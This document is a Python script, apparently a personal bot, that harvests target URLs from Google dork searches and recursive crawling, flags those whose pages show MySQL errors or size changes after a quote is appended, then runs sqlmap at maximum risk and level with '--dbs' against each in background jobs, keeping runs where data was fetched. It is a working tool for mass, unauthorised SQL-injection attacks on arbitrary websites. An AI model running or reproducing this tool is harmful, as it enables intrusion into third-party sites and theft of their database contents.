from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchWindowException

from selenium.common.exceptions import WebDriverException
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.common.exceptions import InvalidArgumentException
from random import randint
import time
import sys
import _thread
import os
import re
from urllib import request

#DO NOT CHANGE THIS
false=0
sqlError=1
sizeChange=2
blueFont='\033[94m'	#getsColor
yellowFont='\033[93m' #testsites color
greenFont='\033[92m' #exploit color
endFont = '\033[0m' # end color
#CONFIGURATION FILES
sqlMapPath="../sqlmap/"
priorityFile="sqlVulnerable.txt"
priorityFileLock=False
errorFile="maybeVulnerable.txt"
errorFileLock=False
sitesFile="google.txt"
recursiveSitesFile="googleRecursive.txt"
recursiveSitesFileLock=False
sitesFileLock=False
dorkListFile="dorks.txt"
dorkListFileLock=False
proxyFile="proxy.txt"
proxyFileLock=False
banningFile="banningIA.txt"
banningFileLock=False

firefoxDriver='/Users/s-man/Desktop/sqlBot/mac/geckodriver'

bannedKeywordsFile="banned.txt"
bannedKeywordsFileLock=False
bannedKeywords=[]
def getDomainName(link):
	if(link[-1]=='\n'):
		link=link[:-1]
	x=link
	x=x[x.find('//')+2:]
	if(x.find('/')!=-1):
		x=x[:x.find('/')]

	if x[0:4]=='www.':
		x=x[4:]

	
	result=x[x.rfind("."):]
	
	x=x[0:x.rfind(".")]
	
	
	if(x.rfind(".")==-1):
		result=x+result
	else:
		result=x[x.rfind(".")+1:]+result
	return result
def valid(link):
	if(link[-1]=='/'):
		link=link[:-1]
	bannedKeywords=getSites(bannedKeywordsFile, bannedKeywordsFileLock)
	queue=getSites(priorityFile, priorityFileLock)+getSites(errorFile, errorFileLock)
	bannedExt=[".html",".jpg",".jpeg",".png",".pdf",");",".js"]
	#print(link+'\n')
	for ext in bannedExt:
		if link[len(link)-len(ext):]==ext:
			print("NO : extention "+ext+" banned\n")
			return False
	if link[link.find('//')+2:].find('/')==-1:
		print("NO : site without parameters\n")
		return False
	for keyword in bannedKeywords:
		if(keyword=='' or keyword=="\n"):
			continue
		if(keyword[len(keyword)-1]=='\n'):
			keyword=keyword[:len(keyword)-1]
		if getDomainName(link).find(keyword)!=-1 :
			print("NO : "+keyword+"domain banned\n")
			return False
	for keyword in queue:
		if(keyword[len(keyword)-1]=='\n'):
			keyword=keyword[:len(keyword)-1]
		if getDomainName(link).find(getDomainName(keyword))!=-1:
			print("NO : "+keyword+"domain already in queue\n")
			return False
	
	return True
def checkExt(url):
	bannedExts=[".jpg",".jpeg",".png",".pdf",");",".js"]
	for bannedExt in bannedExts:
		if(url.find(bannedExt+"?")!=-1):
		
			return False
		elif(url[len(url)-len(bannedExt):]==bannedExt):
			
			return False
	#print("ok")
	return True


def checkExtForInjection(url):
	bannedExts=[".jpg",".html",".jpeg",".png",".pdf",");",".js"]
	for bannedExt in bannedExts:
		if(url.find(bannedExt+"?")!=-1):
			print("no ext banned")
			return False
		elif(url[len(url)-len(bannedExt):]==bannedExt):
			print("no ext banned")
			return False
	#print("ok")
	return True


def filterListOfRecursive(liste):
	result=[]
	for l in liste:
		add=True
		for valid in result:
			if getDomainName(l) == getDomainName(valid):
				add=False
				break
		if(add==True):
			if(l[len(l)]-1=='/'):
				l=l[:len(l)-1]
			result.append(l)
	return result

def getRecursiveUrls(link,recuriveSearch):
	if(recuriveSearch==0):
		return []
	#if(browser==0):
	#	browser = webdriver.Firefox()
	#	browser.set_page_load_timeout(15)
	text=""
	headers = {
   'Referer': 'http://www.google.com/bot.html',
   'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36'
}
	#response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
	try:
		print("recursive for "+link)
		req = request.Request(link,headers=headers)
		response = request.urlopen(req)
		text=response.read().decode("utf-8")
		#siteLen=len(pageSource)
	except:
		print("error opening site"+link)
		text=""

	urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', text)
	result=[]

	urlsFiltered=[i for i in urls if (getDomainName(i)!=getDomainName(link) and checkExt(i)) and  not bool(re.match("https*:\/\/[^\/]*\/$",i)) and not bool(re.match("https*:\/\/[^\/]*$",i)) ]
	#urlsFiltered=[i for i in urlsFiltered if]
	
	print("extracted %s filtred %s"%(str(len(urls)),str(len(urlsFiltered))))
	appendSitesOnFile(urlsFiltered, sitesFile, sitesFileLock)

	for url in urlsFiltered:
		getRecursiveUrls(url,recuriveSearch-1)
	
	#result = list( dict.fromkeys(result) )	
	#return result


def extractSites(query):
	page=0
	results=1
	liste=[]
	browser = webdriver.Firefox()
	while results>0:
		url='https://www.google.fr/search?q=%s&start=%s' % (query,page)

		try:
			browser.get(url)
			source=browser.page_source.find('g-recaptcha-response')
		except TimeoutException:
			print("Network error")
			pass
		except :
			browser.close()
			browser = webdriver.Firefox()
			browser.get(url)
			source=browser.page_source.find('g-recaptcha-response')
			pass
		
		
		while (source!=-1) :
			time.sleep(60)
			try:
				source=browser.page_source.find('g-recaptcha-response')
			except TimeoutException:
				print("Network error")
				pass
			except NoSuchWindowException:
				browser.close()
				browser = webdriver.Firefox()
				browser.get(url)
				source=browser.page_source.find('g-recaptcha-response')
				pass
			
		else:
			for site in browser.find_elements_by_class_name('r'):
				try:
					link=site.find_element_by_tag_name('a').get_attribute('href')
				except :
					link="https://www.google.fr/"
					pass
				if link[len(link)-1]=='/':
					link=link[0:len(link)-1]
				#GET SITES ON SITE
				
				liste.append(link)
				
			results=len(browser.find_elements_by_class_name('r'))
			page+=10
			

	
	print("%s sites extracted \n"%str(len(liste)))
	appendSitesOnFile(liste,sitesFile,sitesFileLock)
	appendSitesOnFile(liste,recursiveSitesFile,recursiveSitesFileLock)
	browser.close()
	
	
	
	
	
	
			
def testChar(source,sizeOfOriginal):
	keywords=['mysql','syntax']
	for keyword in keywords:
		if source.lower().find(keyword) !=-1 :
			print(keyword+" keyword found")
			return sqlError
	if abs(sizeOfOriginal-len(source))>100 :
		print("size change")
		return sizeChange
	else :
		print("not vulnerable")
		return False
def testSite(site):
	if(site[-1]=='\n'):
		site=site[0:-1]
	
	sqlChars=['\'']

	headers = {
   'Referer': 'http://www.google.com/bot.html',
   'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36'
}
	#response = requests.get('https://www.mobilefun.fr/apple/iphone-5/gadgets', headers=headers)
	try:
		req = request.Request(site,headers=headers)
		response = request.urlopen(req)
		pageSource=response.read().decode("utf-8")
		siteLen=len(pageSource)
	except:
		print("error opening site")
		return False
	

	for sqlChar in sqlChars:
		
		result=False
		try:	
			req = request.Request(site+sqlChar,headers=headers)
			response = request.urlopen(req)
			pageSource=response.read().decode("utf-8")
			result=testChar(pageSource,siteLen)
		
		except Exception as err:
			print("error opening site with injection char")
			
			return False
		
		if(result==sqlError or result==sizeChange):
			
			return result
	
	return False
def testSites(sitesFileLock):

	
	lSql=[]
	lError=[]
	i=0

	sitesNum=getNumber(sitesFile, sitesFileLock)
	
	while(sitesNum==0):
		print(yellowFont+"Waiting for vulnerable sites to come\n"+endFont)
		time.sleep(60)
		sitesNum=getNumber(sitesFile, sitesFileLock)

	while(sitesNum>0):
		site=getSite(sitesFile, sitesFileLock)
		if(site[len(site)-1]=='/'):
			site=site[0:len(site)-1]
		i+=1
		print((yellowFont+"Testing site %s of %s %s"+endFont)%(sitesNum,str(i),site))
		if(site[-1]=='\n'):
			site=site[0:-1]
		if( checkExtForInjection(site) and valid(site)):
			
			
	
			res=testSite(site)
			if res==sqlError:
				print(yellowFont+"sql"+endFont)
				lSql.append(site)
				appendSiteOnFile(site+"\n",priorityFile,priorityFileLock)
			elif res==sizeChange:
				print(yellowFont+"maybe"+endFont)
				lError.append(site)
				appendSiteOnFile(site+"\n",errorFile,errorFileLock)
		sitesNum=getNumber(sitesFile, sitesFileLock)
		while(sitesNum==0):
			print(yellowFont+"Waiting for vulnerable sites to come\n"+endFont)
			time.sleep(60)
			sitesNum=getNumber(sitesFile, sitesFileLock)

	
	
	return (lSql,lError)

def getSitesByDork(dork):
	dork=dork.replace('&', '%26')
	dork=dork.replace(' ','+')
	extractSites(dork)
	

def appendSitesOnFile(l,file,lock):


	while(lock):
		print("Waiting for %s To be unlocked"%(file))
	lock=True
	#print(str(len(l))+" have to be writed")
	#files  = open(file, "r")
	#sites =[ getDomainName(f) for f in files.readlines() if f !="\n" ]
	#files.close()
	files  = open(file, "a")
	newL=[]
#	for site in l:
	#	print(" %s not in sites %s"%(getDomainName(site), getDomainName(site) not in sites))
	#	print(sites)
#		if( getDomainName(site) not in sites ):
	#		sites.append(site)
	#		newL.append(site)
	#newL=[site for site in l if getDomainName(site) not in sites ]
	files.writelines('\n'.join(l))
	files.close()
	#print(str(len(newL))+" have been writed")
	
	lock=False


def appendSiteOnFile(site,fileName,lock):

	while(lock):
		print("waiting for %s To be Unlocked"%(file))
	lock=True
	


	#file  = open(fileName, "r")
	#sites =[ getDomainName(f) for f in file.readlines() if f  !="\n" ]
	#file.close()
	file  = open(fileName, "a")
	#if(getDomainName(site) in sites):
	#	print("site already in file")
	#else:
	file.write('%s' % site)
	file.close()


	lock=False
	
def testIfBan(liste,site,banningFileLock):
	if(site[-1]=='\n'):
		site=site[0:-1]
	numOfTests=1
	result=False
	for siteToCheck in liste:
		
		if(siteToCheck.find(site)!=-1):
			
			liste.remove(siteToCheck)
			numOfTests=int(siteToCheck.split(":")[1])
			if(numOfTests>5):
				result=True
				print(site+" banned")
			else:
				numOfTests=numOfTests+1
				
				result= False
			break
	if result==False:

		liste.append(site+":"+str(numOfTests)+"\n")
	while(banningFileLock):
		print("waiting for %s To be Unlocked"%(banningFile))
	banningFileLock=True
	
	

	files=open(banningFile, "w")
	files.writelines(liste)
	files.close()

	banningFileLock=False

	return result



def filter():
	files=os.listdir("finished")
	for file in files:
		if file[0]!=".":
			print("Checking file "+file,end="")
			f=open("finished/"+file, "r")
			found=False
			for line in f.readlines():
				if line.find("fetched data logged")!=-1:
					found=True
					break
			if found==False:
				os.remove("finished/"+file)
				print("\n")
				listOfRemoved=getSites(banningFile, banningFileLock)

				if(testIfBan(listOfRemoved,file[:-7]+"\n",banningFileLock)):
					appendSiteOnFile(file[:-7], bannedKeywordsFile, bannedKeywordsFileLock)

			else:
				print("Found \n")
			f.close()
def getSite(fileName,lock):

	while(lock):
		print("waiting for %s To be Unlocked"%(fileName))
	lock=True
	
	

	files=open(fileName, "r")
	sites=files.readlines()
	files.close()
	site=sites[0]
	del sites[0]
	
	#x=input("confirmer"+str(len(sites)))
	
	#sites = sites[1:]

	files=open(fileName, "w")
	if(len(sites)>0):
		files.writelines(sites)
	files.close()

	#x=input("verifier google")
	lock=False
	
	
	
	return site



def getSites(fileName,lock):

	while(lock):
		print("waiting for %s To be Unlocked"%(fileName))
	lock=True
	
	

	files=open(fileName, "r")
	sites=files.readlines()
	
	return sites
def getNumber(fileName,lock):


	while(lock):
		print("waiting for %d To be Unlocked"%(fileName))
	lock=True
	


	files=open(fileName, "r")
	sites=files.readlines()
	files.close()



	lock=False


	#print("sites="+str(sites)+"leen="+str(len(sites)))
	return len(sites)
def exploit(maxthreads):



	
	priorityFileNumber=getNumber(priorityFile, priorityFileLock)
	
	
	errorFileNumber=getNumber(errorFile,errorFileLock)
	

	os.system("mkdir working")
	os.system("mkdir finished")
	while(priorityFileNumber==0 and errorFileNumber == 0):
		print(greenFont+"Waiting for sites to come\n"+endFont)
		time.sleep(60)
		

		priorityFileNumber=getNumber(priorityFile, priorityFileLock)

	
		errorFileNumber=getNumber(errorFile,errorFileLock)
	

	while priorityFileNumber > 0 or errorFileNumber > 0 :

		while(getSqlMapThreads()>maxthreads):
			print(greenFont+"Waiting for others to finish exploit\n"+endFont)
			time.sleep(100)
			
		else:

			if(priorityFileNumber > 0 ):
				site=getSite(priorityFile,priorityFileLock)
				
			else:
				site=getSite(errorFile,errorFileLock)
			

			priorityFileNumber=getNumber(priorityFile, priorityFileLock)
	
	
			errorFileNumber=getNumber(errorFile,errorFileLock)
			

			if(site[len(site)-1]=='\n'):
				site=site[0:len(site)-1]
			siteFile=getDomainName(site)
			randomInt1=randint(0, 9)
			randomInt2=randint(0, 9)
			print(greenFont+"executing exploit for "+siteFile+"\n"+endFont)
			command=' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site,siteFile,str(randomInt1)+str(randomInt2),sqlMapPath,site,siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2),siteFile,str(randomInt1)+str(randomInt2))
			os.system(command)
			while(priorityFileNumber==0 and errorFileNumber == 0):
				print(greenFont+"Waiting for sites to come\n"+endFont)
				time.sleep(50)
				

				priorityFileNumber=getNumber(priorityFile, priorityFileLock)
	
	
				errorFileNumber=getNumber(errorFile,errorFileLock)
				

	else:
		print(greenFont+"no sites to test"+endFont)
def all(maxThreads,recursiveSearchNumber):
	
	_thread.start_new_thread( gets, () )
	_thread.start_new_thread( testSites, (sitesFileLock,) )
	_thread.start_new_thread( exploit, (maxThreads,) )
	if(recursiveSearchNumber>0):
		_thread.start_new_thread( recursiveSearch, (recursiveSearchNumber,) )
	
	while True:
		pass






def gets():
	print(blueFont)
	dorksNumber=getNumber(dorkListFile, dorkListFileLock)
	while dorksNumber==0:
		print(blueFont+"Waiting for new dorks"+endFont)
		time.sleep(60)
		dorksNumber=getNumber(dorkListFile, dorkListFileLock)
	while(dorksNumber>0):
		dork=getSite(dorkListFile, dorkListFileLock)
		getSitesByDork(dork)
		dorksNumber=getNumber(dorkListFile, dorkListFileLock)
		while dorksNumber==0:
			print(blueFont+"Waiting for new dorks"+endFont)
			time.sleep(60)
			dorksNumber=getNumber(dorkListFile, dorkListFileLock)

	print("End get dorks")
def clean():
	os.system("rm *.txt")
	os.system("rm -rf working finished")
def setup():
	os.system("export PATH=$PATH:"+firefoxDriver)
	os.system("touch "+priorityFile+" "+errorFile+" "+sitesFile+" "+dorkListFile+ " "+bannedKeywordsFile+" "+recursiveSitesFile+" "+banningFile)
	#os.system("echo \"google.\" > "+bannedKeywordsFile)

def recursiveSearch(number):

	print("recuriveSearch")
	readyToCheckNumber=getNumber(sitesFile, sitesFileLock)
	sitesNumber=getNumber(recursiveSitesFile, recursiveSitesFileLock)
	while sitesNumber==0:
		print("Waiting for new sites for recursiveSearch")
		time.sleep(60)
		sitesNumber=getNumber(recursiveSitesFile, recursiveSitesFileLock)
	while readyToCheckNumber>5000:
		print("proirity to readyToCheckSites")
		time.sleep(60)
		readyToCheckNumber=getNumber(sitesFile, sitesFileLock)
	#recursiveBrowser = webdriver.Firefox()
	while(sitesNumber>0):



		link=getSite(recursiveSitesFile, recursiveSitesFileLock)
		
		#print("recuriveSearch for "+link)
		#newListe=
		getRecursiveUrls(link,number)
		


		readyToCheckNumber=getNumber(sitesFile, sitesFileLock)
		sitesNumber=getNumber(recursiveSitesFile, recursiveSitesFileLock)

		#if(sitesNumber==0):
			#recursiveBrowser.close()
		while sitesNumber==0 :
			print("Waiting for new sites for recursiveSearch")
			time.sleep(60)
			sitesNumber=getNumber(recursiveSitesFile, recursiveSitesFileLock)
		while readyToCheckNumber>5000:
			print("proirity to readyToCheckSites")
			time.sleep(60)
			readyToCheckNumber=getNumber(sitesFile, sitesFileLock)
		#recursiveBrowser = webdriver.Firefox()
	
	
	
	print("end recuriveSearch")
	#recursiveBrowser.close()
		
	

def getSqlMapThreads():
	return int(int(os.popen("ps aux | grep sqlmap | sed -E '/sh -c/d' | sed -E '/grep/d' | wc -l | sed -E 's/ *//'").readline()[0:-1]))
def main():
	
	if(len(sys.argv)==4 and sys.argv[1]=="get"):
		getSitesByDork(sys.argv[2])
		if(int(sys.argv[3])>0):
			recursiveSearch(int(sys.argv[3]))
		testSites(sitesFileLock)
		
	elif(len(sys.argv) == 3 and sys.argv[1]=="exploit"):
		maxThreads=int(sys.argv[2])
		exploit(maxThreads)

	elif(len(sys.argv) == 2 and  sys.argv[1]=="filter"):
		filter()
	elif(len(sys.argv) == 3 and  sys.argv[1]=="recursiveSearch"):
		recursiveSearch(int(sys.argv[2]))
	elif(len(sys.argv) == 2 and  sys.argv[1]=="setup"):
		setup()
	elif(len(sys.argv) == 3 and  sys.argv[1]=="gets"):
		gets()
		if(int(sys.argv[3])>0):
			recursiveSearch(int(sys.argv[3]))
	elif(len(sys.argv) == 4 and  sys.argv[1]=="all"):
		all(int(sys.argv[2]),int(sys.argv[3]))
	else :
		print("usage : "+sys.argv[0]+" get dork recursiveSearch\n")
		print("usage : "+sys.argv[0]+" gets recursiveSearch\n")
		print("usage : "+sys.argv[0]+" exploit maxthreads\n")
		print("usage : "+sys.argv[0]+" filter\n")

		print("usage : "+sys.argv[0]+" recursiveSearch int\n")
		print("usage : "+sys.argv[0]+" setup\n")
		print("usage : "+sys.argv[0]+" all maxthreads recursiveSearch\n")


#print(getRecursiveUrls("http://www.epresspack.net/ibis-budget-hotels-essentiel-du-confort-petit-prix/ibis-budget-mise-sur-le-digital/", 2))
main()


